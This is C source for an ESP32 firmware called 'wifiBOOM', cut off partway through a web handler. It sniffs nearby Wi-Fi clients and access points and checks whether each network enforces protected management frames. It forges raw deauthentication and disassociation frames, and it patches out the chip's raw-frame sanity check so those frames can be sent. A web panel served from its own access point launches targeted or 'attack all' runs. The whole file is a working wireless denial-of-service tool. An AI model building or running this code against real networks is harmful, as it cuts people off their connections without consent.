#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <math.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"

#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "nvs_flash.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "cJSON.h"
#include "driver/gpio.h"

static const char *TAG = "wifiBOOM";

#define FIRST_CHANNEL       1
#define LAST_CHANNEL        13
#define DWELL_MS            300

#define OBS_QUEUE_LENGTH    256
#define BEACON_QUEUE_LENGTH 64
#define CMD_QUEUE_LENGTH    16
#define BTN_QUEUE_LENGTH    4

#define MAX_PAIRS           128
#define MAX_NETWORKS        128
#define HASH_SIZE           256

#define BUTTON_GPIO         0
#define LED_GPIO            2

#define MACSTR "%02X:%02X:%02X:%02X:%02X:%02X"
#define MACARG(m) \
    (m)[0], (m)[1], (m)[2], \
    (m)[3], (m)[4], (m)[5]

#define AP_SSID             "Heart"
#define AP_PASS             "boom1234"
#define AP_CHANNEL          6
#define AP_MAX_CONN         1
#define REASON_PREV_AUTH_INVALID            2  
#define REASON_DEAUTH_LEAVING               3  
#define REASON_DISASSOC_DUE_TO_INACTIVITY   4  
#define REASON_DISASSOC_STA_HAS_LEFT        8  

extern const char index_html_start[] asm("_binary_index_html_start");
extern const char index_html_end[]   asm("_binary_index_html_end");

typedef enum {
    STATE_STARTING = 0,
    STATE_SCANNING,
    STATE_SWITCHING,
    STATE_CONTROL,
    STATE_ATTACK,
    STATE_ERROR
} system_state_t;

typedef enum {
    CMD_START_SCAN = 0,
    CMD_START_ATTACK
} system_cmd_type_t;

typedef enum {
    PMF_NOT_OBSERVED = 0,
    PMF_NO_RSN,
    PMF_INVALID_RSN,
    PMF_DISABLED,
    PMF_OPTIONAL,
    PMF_REQUIRED
} pmf_policy_t;

typedef struct {
    system_cmd_type_t type;
    uint8_t mode;
    uint8_t subtype;
    uint8_t direction;
    uint32_t duration_ms;
    bool attack_all;
    uint8_t bssid[6];
    uint8_t sta[6];
    uint8_t channel;
} system_cmd_t;

typedef struct {
    uint8_t sta[6];
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t channel;
    uint8_t subtype;
} observation_t;

typedef struct {
    uint8_t sta[6];
    uint8_t bssid[6];
    uint32_t packets;
    uint8_t best_channel;
    int8_t best_rssi;
} pair_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t ssid_len;
    uint8_t channel;
    int8_t rssi;
    pmf_policy_t pmf_policy;
} beacon_info_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t ssid_len;
    uint8_t channel;
    int8_t best_rssi;
    uint32_t beacon_count;
    pmf_policy_t pmf_policy;
} network_t;

static QueueHandle_t observation_queue = NULL;
static QueueHandle_t beacon_queue = NULL;
static QueueHandle_t command_queue = NULL;
static QueueHandle_t button_event_queue = NULL;

static pair_t pairs[MAX_PAIRS];
static uint16_t pair_count = 0;
static uint16_t pair_hash_table[HASH_SIZE];
static SemaphoreHandle_t pairs_mutex = NULL;

static network_t networks[MAX_NETWORKS];
static uint16_t network_count = 0;
static SemaphoreHandle_t networks_mutex = NULL;

static httpd_handle_t server_handle = NULL;
static esp_netif_t *ap_netif = NULL;

static volatile system_state_t current_state = STATE_STARTING;
static volatile bool attack_active = false;
static volatile bool attack_all = false;
static volatile bool scan_active = false;

static uint8_t attack_mode = 0;
static uint8_t attack_subtype = 0;
static uint8_t attack_direction = 0;
static uint32_t attack_duration_ms = 0;
static uint32_t scan_duration_ms = 0;
static int64_t attack_start_timestamp = 0;
static int64_t scan_start_timestamp = 0;

static uint8_t target_bssid[6] = {0};
static uint8_t target_sta[6] = {0};
static uint8_t target_channel = 1;

static uint8_t current_scan_channel = FIRST_CHANNEL;
static int64_t last_channel_switch_tick = 0;

static volatile uint32_t obs_drop_count = 0;
static volatile uint32_t beacon_drop_count = 0;

static void led_blink(int count, int delay_ms) {
    for (int i = 0; i < count; i++) {
        gpio_set_level(LED_GPIO, 1);
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
        gpio_set_level(LED_GPIO, 0);
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
    }
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; 
}

static const char *subtype_name(uint8_t subtype) {
    switch (subtype) {
        case 0:   return "DATA";
        case 4:   return "NULL";
        case 8:   return "QOS_DATA";
        case 12:  return "QOS_NULL";
        default:  return "UNKNOWN";
    }
}

static const char *pmf_policy_name(pmf_policy_t policy)
{
    switch (policy) {
        case PMF_NOT_OBSERVED: return "NOT_OBSERVED";
        case PMF_NO_RSN:       return "NO_RSN";
        case PMF_INVALID_RSN:  return "INVALID_RSN";
        case PMF_DISABLED:     return "DISABLED";
        case PMF_OPTIONAL:     return "OPTIONAL";
        case PMF_REQUIRED:     return "REQUIRED";
        default:               return "UNKNOWN";
    }
}

static uint32_t hash_mac_pair(const uint8_t *a, const uint8_t *b) {
    uint32_t h = 2166136261u;
    for (int i = 0; i < 6; i++) { h ^= a[i]; h *= 16777619u; }
    for (int i = 0; i < 6; i++) { h ^= b[i]; h *= 16777619u; }
    return h;
}

static int find_or_create_pair(const observation_t *obs, bool *is_new) {
    uint32_t slot = hash_mac_pair(obs->sta, obs->bssid) % HASH_SIZE;
    *is_new = false;

    for (uint32_t n = 0; n < HASH_SIZE; n++) {
        uint16_t entry = pair_hash_table[slot];
        if (entry == 0) {
            if (pair_count >= MAX_PAIRS) return -1;
            uint16_t index = pair_count++;
            pair_t *p = &pairs[index];
            memcpy(p->sta, obs->sta, 6);
            memcpy(p->bssid, obs->bssid, 6);
            p->packets = 0;
            p->best_rssi = -127;
            p->best_channel = obs->channel;
            pair_hash_table[slot] = index + 1;
            *is_new = true;
            return index;
        }

        uint16_t index = entry - 1;
        pair_t *p = &pairs[index];
        if (memcmp(p->sta, obs->sta, 6) == 0 && memcmp(p->bssid, obs->bssid, 6) == 0) {
            return index;
        }
        slot = (slot + 1) % HASH_SIZE;
    }
    return -1;
}

static void rebuild_pair_hash_table(void) {
    memset(pair_hash_table, 0, sizeof(pair_hash_table));
    for (uint16_t i = 0; i < pair_count; ++i) {
        uint32_t slot = hash_mac_pair(pairs[i].sta, pairs[i].bssid) % HASH_SIZE;
        while (pair_hash_table[slot] != 0) slot = (slot + 1) % HASH_SIZE;
        pair_hash_table[slot] = i + 1;
    }
}

static bool should_update_pmf(pmf_policy_t current, pmf_policy_t incoming) {
    if (incoming == PMF_NOT_OBSERVED)
        return false;

    bool current_valid = (current == PMF_DISABLED || current == PMF_OPTIONAL || current == PMF_REQUIRED);
    bool incoming_valid = (incoming == PMF_DISABLED || incoming == PMF_OPTIONAL || incoming == PMF_REQUIRED);

    if (incoming_valid) return true;
    if (current_valid) return false;
    return true;
}

static int find_or_create_network(const beacon_info_t *b, bool *is_new) {
    *is_new = false;
    for (int i = 0; i < network_count; i++) {
        if (memcmp(networks[i].bssid, b->bssid, 6) == 0) {
            if (networks[i].ssid_len == 0 && b->ssid_len > 0) {
                memcpy(networks[i].ssid, b->ssid, sizeof(networks[i].ssid));
                networks[i].ssid_len = b->ssid_len;
            }
            if (should_update_pmf(networks[i].pmf_policy, b->pmf_policy)) {
                networks[i].pmf_policy = b->pmf_policy;
            }
            return i;
        }
    }
    if (network_count >= MAX_NETWORKS) return -1;

    int index = network_count++;
    network_t *n = &networks[index];
    memcpy(n->bssid, b->bssid, 6);
    memcpy(n->ssid, b->ssid, sizeof(n->ssid));
    n->ssid_len = b->ssid_len;
    n->channel = b->channel;
    n->best_rssi = b->rssi;
    n->beacon_count = 0;
    n->pmf_policy = b->pmf_policy;
    *is_new = true;
    return index;
}

static pmf_policy_t parse_rsn_pmf(const uint8_t *tagged, size_t tagged_len) {
    if (tagged == NULL) return PMF_INVALID_RSN;
    size_t offset = 0;

    while (offset < tagged_len) {
        if (tagged_len - offset < 2) return PMF_INVALID_RSN;
        uint8_t tag_id = tagged[offset];
        uint8_t tag_len = tagged[offset + 1];
        offset += 2;

        if (tag_len > tagged_len - offset) return PMF_INVALID_RSN;

        if (tag_id == 48) {
            const uint8_t *rsn = tagged + offset;
            if (tag_len < 8) return PMF_INVALID_RSN;
            uint16_t version = rsn[0] | (rsn[1] << 8);
            if (version != 1) return PMF_INVALID_RSN;

            size_t pos = 6;
            uint16_t pairwise_count = rsn[pos] | (rsn[pos + 1] << 8);
            pos += 2;
            if ((size_t)pairwise_count > (tag_len - pos) / 4) return PMF_INVALID_RSN;
            pos += (size_t)pairwise_count * 4;

            if (tag_len - pos < 2) return PMF_INVALID_RSN;
            uint16_t akm_count = rsn[pos] | (rsn[pos + 1] << 8);
            pos += 2;
            if ((size_t)akm_count > (tag_len - pos) / 4) return PMF_INVALID_RSN;
            pos += (size_t)akm_count * 4;

            if (tag_len - pos == 0) return PMF_DISABLED;
            if (tag_len - pos < 2) return PMF_INVALID_RSN;

            uint16_t caps = rsn[pos] | (rsn[pos + 1] << 8);
            bool mfpr = (caps & 0x0040) != 0;
            bool mfpc = (caps & 0x0080) != 0;

            if (mfpr && !mfpc) return PMF_INVALID_RSN;
            if (mfpr) return PMF_REQUIRED;
            if (mfpc) return PMF_OPTIONAL;
            return PMF_DISABLED;
        }
        offset += tag_len;
    }
    return PMF_NO_RSN;
}

static void wifi_sniffer(void *buf, wifi_promiscuous_pkt_type_t pkt_type) {
    if (current_state != STATE_SCANNING || attack_active) return;
    
    const wifi_promiscuous_pkt_t *pkt = buf;
    const uint8_t *frame = pkt->payload;
    size_t sig_len = pkt->rx_ctrl.sig_len;
    if (sig_len < 28) return;
    size_t len = sig_len - 4;
    if (len < 24) return;

    uint8_t fc0 = frame[0];
    uint8_t fc1 = frame[1];
    uint8_t type = (fc0 >> 2) & 0x03;
    uint8_t subtype = (fc0 >> 4) & 0x0F;

    if (pkt_type == WIFI_PKT_MGMT && type == 0 && (subtype == 8 || subtype == 5)) {
        if (len < 38) return;
        const uint8_t *bssid = frame + 16;
        const uint8_t *tagged = frame + 24 + 12;
        size_t tagged_len = len - (24 + 12);

        if (tagged_len < 2 || tagged[0] != 0) return;
        uint8_t ssid_len = tagged[1];
        if (ssid_len > 32 || (size_t)(2 + ssid_len) > tagged_len) return;

        beacon_info_t b = {0};
        memcpy(b.bssid, bssid, 6);
        memcpy(b.ssid, tagged + 2, ssid_len);
        b.ssid[ssid_len] = '\0';
        b.ssid_len = ssid_len;
        b.channel = pkt->rx_ctrl.channel;
        b.rssi = pkt->rx_ctrl.rssi;
        b.pmf_policy = parse_rsn_pmf(tagged, tagged_len);

        if (xQueueSend(beacon_queue, &b, 0) != pdTRUE) {
            beacon_drop_count++;
        }
        return;
    }

    if (pkt_type != WIFI_PKT_DATA || type != 2) return;
    if (subtype != 0 && subtype != 4 && subtype != 8 && subtype != 12) return;
    if (subtype >= 8 && len < 26) return;

    bool to_ds = (fc1 & 0x01) != 0;
    bool from_ds = (fc1 & 0x02) != 0;
    const uint8_t *addr1 = frame + 4;
    const uint8_t *addr2 = frame + 10;

    observation_t obs = {0};
    if (to_ds && !from_ds) {
        memcpy(obs.sta, addr2, 6);
        memcpy(obs.bssid, addr1, 6);
    } else if (!to_ds && from_ds) {
        memcpy(obs.sta, addr1, 6);
        memcpy(obs.bssid, addr2, 6);
    } else {
        return;
    }

    if (obs.sta[0] & 0x01) return;

    obs.rssi = pkt->rx_ctrl.rssi;
    obs.channel = pkt->rx_ctrl.channel;
    obs.subtype = subtype;

    if (xQueueSend(observation_queue, &obs, 0) != pdTRUE) {
        obs_drop_count++;
    }
}

static void pair_collector_task(void *arg) {
    observation_t obs;
    while (1) {
        if (xQueueReceive(observation_queue, &obs, portMAX_DELAY) != pdTRUE) continue;
        if (current_state != STATE_SCANNING || attack_active) continue;

        if (xSemaphoreTake(pairs_mutex, portMAX_DELAY) == pdTRUE) {
            bool is_new = false;
            int index = find_or_create_pair(&obs, &is_new);
            if (index >= 0) {
                pair_t *p = &pairs[index];
                p->packets++;
                if (obs.rssi > p->best_rssi) {
                    p->best_rssi = obs.rssi;
                    p->best_channel = obs.channel;
                }
                if (is_new) {
                    printf("[NEW STA #%u] STA=" MACSTR " <-> AP=" MACSTR " CH=%u RSSI=%d TYPE=%s\n",
                        (unsigned)(index + 1), MACARG(p->sta), MACARG(p->bssid),
                        (unsigned)obs.channel, obs.rssi, subtype_name(obs.subtype));
                }
            }
            xSemaphoreGive(pairs_mutex);
        }
    }
}

static void network_collector_task(void *arg) {
    beacon_info_t b;
    while (1) {
        if (xQueueReceive(beacon_queue, &b, portMAX_DELAY) != pdTRUE) continue;
        if (current_state != STATE_SCANNING || attack_active) continue;

        if (xSemaphoreTake(networks_mutex, portMAX_DELAY) == pdTRUE) {
            bool is_new = false;
            int index = find_or_create_network(&b, &is_new);
            if (index >= 0) {
                network_t *n = &networks[index];
                n->beacon_count++;
                if (b.rssi > n->best_rssi) {
                    n->best_rssi = b.rssi;
                    n->channel = b.channel;
                }
                if (is_new) {
                    printf("[NEW NET #%u] SSID=\"%s\" BSSID=" MACSTR " CH=%u RSSI=%d PMF=%s\n",
                        (unsigned)(index + 1), n->ssid, MACARG(n->bssid),
                        b.channel, b.rssi, pmf_policy_name(n->pmf_policy));
                }
            }
            xSemaphoreGive(networks_mutex);
        }
    }
}

void custom_send_deauth(const uint8_t *dst, const uint8_t *src, const uint8_t bssid[6], uint16_t reason) {
    uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
        src[0],  src[1],  src[2],  src[3],  src[4],  src[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        0x00, 0x00, 0x00, 0x00
    };
    packet[24] = reason & 0xFF;
    packet[25] = (reason >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void custom_send_disassoc(const uint8_t *dst, const uint8_t *src, const uint8_t bssid[6], uint16_t reason) {
    uint8_t packet[26] = {
        0xA0, 0x00, 0x00, 0x00,
        dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
        src[0],  src[1],  src[2],  src[3],  src[4],  src[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        0x00, 0x00, 0x00, 0x00
    };
    packet[24] = reason & 0xFF;
    packet[25] = (reason >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

static bool parse_mac(const char *str, uint8_t *mac) {
    if (!str || strlen(str) != 17) return false;
    for (int i = 0; i < 17; i++) {
        if ((i % 3) == 2) {
            if (str[i] != ':') return false;
        } else {
            char c = str[i];
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
                return false;
            }
        }
    }
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)strtoul(&str[i * 3], NULL, 16);
    }
    return true;
}

static esp_err_t status_get_handler(httpd_req_t *req) {
    system_state_t st = current_state;
    bool a_act = attack_active;
    bool a_all = attack_all;
    bool s_act = scan_active;

    uint16_t nc, pc;
    if (xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Network mutex timeout");
        return ESP_FAIL;
    }
    nc = network_count;
    xSemaphoreGive(networks_mutex);

    if (xSemaphoreTake(pairs_mutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Pair mutex timeout");
        return ESP_FAIL;
    }
    pc = pair_count;
    xSemaphoreGive(pairs_mutex);

    cJSON *root = cJSON_CreateObject();
    if (!root) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    if (!cJSON_AddNumberToObject(root, "state", (int)st) ||
        !cJSON_AddBoolToObject(root, "attack_active", a_act) ||
        !cJSON_AddBoolToObject(root, "attack_all", a_all) ||
        !cJSON_AddBoolToObject(root, "scan_active", s_act) ||
        !cJSON_AddNumberToObject(root, "obs_drop_count", (double)obs_drop_count) ||
        !cJSON_AddNumberToObject(root, "beacon_drop_count", (double)beacon_drop_count) ||
        !cJSON_AddNumberToObject(root, "network_count", nc) ||
        !cJSON_AddNumberToObject(root, "network_capacity", MAX_NETWORKS) ||
        !cJSON_AddNumberToObject(root, "pair_count", pc) ||
        !cJSON_AddNumberToObject(root, "pair_capacity", MAX_PAIRS)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM JSON Add");
        return ESP_FAIL;
    }

    const char *json_str = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!json_str) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_str);
    free((void *)json_str);
    return ESP_OK;
}

static esp_err_t networks_get_handler(httpd_req_t *req) {
    if (xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Mutex timeout");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        xSemaphoreGive(networks_mutex);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    for (int i = 0; i < network_count; i++) {
        network_t *n = &networks[i];
        cJSON *item = cJSON_CreateObject();
        if (!item) {
            cJSON_Delete(root);
            xSemaphoreGive(networks_mutex);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM Object");
            return ESP_FAIL;
        }
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), MACSTR, MACARG(n->bssid));

        if (!cJSON_AddStringToObject(item, "ssid", n->ssid_len > 0 ? n->ssid : "(hidden)") ||
            !cJSON_AddStringToObject(item, "bssid", bssid_str) ||
            !cJSON_AddNumberToObject(item, "channel", n->channel) ||
            !cJSON_AddNumberToObject(item, "rssi", n->best_rssi) ||
            !cJSON_AddNumberToObject(item, "beacon_count", n->beacon_count) ||
            !cJSON_AddStringToObject(item, "pmf", pmf_policy_name(n->pmf_policy))) {
            cJSON_Delete(item);
            cJSON_Delete(root);
            xSemaphoreGive(networks_mutex);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM JSON Add");
            return ESP_FAIL;
        }
        cJSON_AddItemToArray(root, item);
    }
    xSemaphoreGive(networks_mutex);

    const char *json_str = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!json_str) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_str);
    free((void *)json_str);
    return ESP_OK;
}

static esp_err_t stations_get_handler(httpd_req_t *req) {
    if (xSemaphoreTake(pairs_mutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Mutex timeout");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        xSemaphoreGive(pairs_mutex);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    for (int i = 0; i < pair_count; i++) {
        pair_t *p = &pairs[i];
        cJSON *item = cJSON_CreateObject();
        if (!item) {
            cJSON_Delete(root);
            xSemaphoreGive(pairs_mutex);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM Object");
            return ESP_FAIL;
        }
        char sta_str[18], bssid_str[18];
        snprintf(sta_str, sizeof(sta_str), MACSTR, MACARG(p->sta));
        snprintf(bssid_str, sizeof(bssid_str), MACSTR, MACARG(p->bssid));

        if (!cJSON_AddStringToObject(item, "sta", sta_str) ||
            !cJSON_AddStringToObject(item, "bssid", bssid_str) ||
            !cJSON_AddNumberToObject(item, "channel", p->best_channel) ||
            !cJSON_AddNumberToObject(item, "rssi", p->best_rssi) ||
            !cJSON_AddNumberToObject(item, "packets", p->packets)) {
            cJSON_Delete(item);
            cJSON_Delete(root);
            xSemaphoreGive(pairs_mutex);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM JSON Add");
            return ESP_FAIL;
        }
        cJSON_AddItemToArray(root, item);
    }
    xSemaphoreGive(pairs_mutex);

    const char *json_str = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!json_str) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_str);
    free((void *)json_str);
    return ESP_OK;
}

static esp_err_t scan_post_handler(httpd_req_t *req) {
    char content[128];
    if (req->content_len >= sizeof(content)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Payload too large");
        return ESP_FAIL;
    }

    int total_recv = 0;
    while (total_recv < req->content_len) {
        int recv_size = httpd_req_recv(req, content + total_recv, req->content_len - total_recv);
        if (recv_size <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid request");
            return ESP_FAIL;
        }
        total_recv += recv_size;
    }
    content[total_recv] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *active = cJSON_GetObjectItem(root, "scan_active");
    cJSON *duration = cJSON_GetObjectItem(root, "duration");

    if (!cJSON_IsBool(active) || !cJSON_IsTrue(active)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid scan_active");
        return ESP_FAIL;
    }

    if (duration && cJSON_IsNumber(duration)) {
        double val = duration->valuedouble;
        if (!isfinite(val) || val < 0 || val > 86400 || floor(val) != val) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid duration value");
            return ESP_FAIL;
        }
    }

    system_cmd_t cmd = {0};
    cmd.type = CMD_START_SCAN;
    cmd.duration_ms = (duration && cJSON_IsNumber(duration)) ? (uint32_t)(duration->valuedouble * 1000) : 0;
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    if (!resp || !cJSON_AddBoolToObject(resp, "status", true)) {
        cJSON_Delete(resp);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM Response");
        return ESP_FAIL;
    }
    const char *json_str = cJSON_PrintUnformatted(resp);
    cJSON_Delete(resp);
    if (!json_str) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM Print");
        return ESP_FAIL;
    }

    if (current_state != STATE_CONTROL) {
        free((void *)json_str);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Scan requires CONTROL state");
        return ESP_FAIL;
    }

    if (xQueueSend(command_queue, &cmd, 0) != pdTRUE) {
        free((void *)json_str);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Command queue full");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_str);
    free((void *)json_str);
    return ESP_OK;
}

static esp_err_t attack_post_handler(httpd_req_t *req) {
    char content[256];
    if (req->content_len >= sizeof(content)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Payload too large");
        return ESP_FAIL;
    }

    int total_recv = 0;
    while (total_recv < req->content_len) {
        int recv_size = httpd_req_recv(req, content + total_recv, req->content_len - total_recv);
        if (recv_size <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid request");
            return ESP_FAIL;
        }
        total_recv += recv_size;
    }
    content[total_recv] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *active = cJSON_GetObjectItem(root, "active");
    if (!cJSON_IsBool(active) || !cJSON_IsTrue(active)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid active field");
        return ESP_FAIL;
    }

    system_cmd_t cmd = {0};
    cmd.type = CMD_START_ATTACK;

    cJSON *all = cJSON_GetObjectItem(root, "attack_all");
    cJSON *mode = cJSON_GetObjectItem(root, "mode");
    cJSON *subtype = cJSON_GetObjectItem(root, "subtype");
    cJSON *direction = cJSON_GetObjectItem(root, "direction");
    cJSON *duration = cJSON_GetObjectItem(root, "duration");
    cJSON *bssid_str = cJSON_GetObjectItem(root, "bssid");
    cJSON *sta_str = cJSON_GetObjectItem(root, "sta");
    cJSON *channel = cJSON_GetObjectItem(root, "channel");

    if (channel && cJSON_IsNumber(channel)) {
        double v = channel->valuedouble;
        if (!isfinite(v) || v < FIRST_CHANNEL || v > LAST_CHANNEL || floor(v) != v) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid channel range");
            return ESP_FAIL;
        }
        cmd.channel = (uint8_t)v;
    } else {
        cmd.channel = 1;
    }

    cmd.attack_all = cJSON_IsBool(all) ? cJSON_IsTrue(all) : false;
    cmd.mode = (mode && cJSON_IsNumber(mode)) ? (uint8_t)mode->valuedouble : 0;
    cmd.subtype = (subtype && cJSON_IsNumber(subtype)) ? (uint8_t)subtype->valuedouble : 0;
    cmd.direction = (direction && cJSON_IsNumber(direction)) ? (uint8_t)direction->valuedouble : 0;
    cmd.duration_ms = (duration && cJSON_IsNumber(duration)) ? (uint32_t)(duration->valuedouble * 1000) : 0;

    if (cJSON_IsString(bssid_str)) {
        if (!parse_mac(bssid_str->valuestring, cmd.bssid)) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid BSSID format");
            return ESP_FAIL;
        }
    } else if (!cmd.attack_all) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "BSSID required");
        return ESP_FAIL;
    }

    if (cJSON_IsString(sta_str)) {
        if (!parse_mac(sta_str->valuestring, cmd.sta)) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid STA format");
            return ESP_FAIL;
        }
    }
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    if (!resp || !cJSON_AddBoolToObject(resp, "queued", true)) {
        cJSON_Delete(resp);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM Response");
        return ESP_FAIL;
    }
    const char *json_str = cJSON_PrintUnformatted(resp);
    cJSON_Delete(resp);
    if (!json_str) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM Print");
        return ESP_FAIL;
    }

    if (xQueueSend(command_queue, &cmd, 0) != pdTRUE) {
        free((void *)json_str);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Command queue full");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_str);
    free((void *)json_str);
    return ESP_OK;
}

static esp_err_t table_manage_post_handler(httpd_req_t *req) {
    if (current_state != STATE_CONTROL) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Control phase required");
        return ESP_FAIL;
    }
    char content[192];
    if (req->content_len <= 0 || req->content_len >= sizeof(content)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid body size");
        return ESP_FAIL;
    }
    size_t got = 0;
    while (got < (size_t)req->content_len) {
        int n = httpd_req_recv(req, content + got, req->content_len - got);
        if (n <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Body receive error");
            return ESP_FAIL;
        }
        got += (size_t)n;
    }
    content[got] = 0;
    cJSON *json = cJSON_Parse(content);
    if (!json) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }
    const cJSON *table = cJSON_GetObjectItemCaseSensitive(json, "table");
    const cJSON *action = cJSON_GetObjectItemCaseSensitive(json, "action");
    const cJSON *bssid = cJSON_GetObjectItemCaseSensitive(json, "bssid");
    const cJSON *sta = cJSON_GetObjectItemCaseSensitive(json, "sta");
    bool nets = cJSON_IsString(table) && strcmp(table->valuestring, "networks") == 0;
    bool stations = cJSON_IsString(table) && strcmp(table->valuestring, "stations") == 0;
    bool clear = cJSON_IsString(action) && strcmp(action->valuestring, "clear") == 0;
    bool del = cJSON_IsString(action) && strcmp(action->valuestring, "delete") == 0;
    uint8_t b[6], a[6];
    bool valid = (nets || stations) && (clear || del);
    if (del) valid = valid && cJSON_IsString(bssid) && parse_mac(bssid->valuestring, b)
                          && (!stations || (cJSON_IsString(sta) && parse_mac(sta->valuestring, a)));
    cJSON_Delete(json);
    if (!valid) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid parameters");
        return ESP_FAIL;
    }
    SemaphoreHandle_t mutex = nets ? networks_mutex : pairs_mutex;
    if (xSemaphoreTake(mutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Table busy");
        return ESP_FAIL;
    }
    bool changed = false;
    if (nets) {
        if (clear) {
            changed = network_count > 0;
